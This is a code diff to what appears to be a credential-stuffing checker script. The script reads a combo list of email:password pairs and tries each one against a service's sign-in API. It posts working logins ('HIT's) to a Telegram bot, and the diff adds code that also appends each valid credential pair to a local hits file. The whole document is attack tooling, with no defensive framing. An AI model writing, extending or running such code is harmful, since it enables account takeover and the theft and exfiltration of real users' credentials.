@@ -44,7 +44,7 @@ rainbow_line = ''.join(
 print(rainbow_line + RESET)
 print()
 
-def login(email, pasw, tok, ID):
+def login(email, pasw, tok, ID, save_path):
     headers = {
         "ETP-Anonymous-ID": str(uuid1),
         "Request-Type": "SignIn",
@@ -118,9 +118,13 @@ def login(email, pasw, tok, ID):
 """           
                     print(f' {G}{msg}')
                     requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={msg}')
+                    with open(save_path, 'a') as f:
+                        f.write(f'{email}:{pasw}\n')
                 except:
                     print(f" {G}{email}:{pasw} ⥤ [HIT] ")
                     requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={email}:{pasw}')
+                    with open(save_path, 'a') as f:
+                        f.write(f'{email}:{pasw}\n')
             else:
                 print()
                 print(f'{O}{email}:{pasw} ⥤ [CUSTOM] ')
@@ -141,7 +145,12 @@ print()
 ID = console.input("[bold cyan]ENTER YOUR USER ID ➾ [/bold cyan]")
 
 print()
+
 file_name = console.input("[bold cyan]ENTER YOUR COMBO LIST ➾ [/bold cyan]")
+
+print()
+
+save_path = console.input("[bold cyan]ENTER THE PATH TO SAVE HITS ➾ [/bold cyan]")
 
 with open(file_name) as file:
     lines = file.read().splitlines()
@@ -149,6 +158,6 @@ with open(file_name) as file:
 for line in lines:
     try:
         email, pasw = line.strip().split(':')
-        login(email, pasw, tok, ID)
+        login(email, pasw, tok, ID, save_path)
     except:
         continue
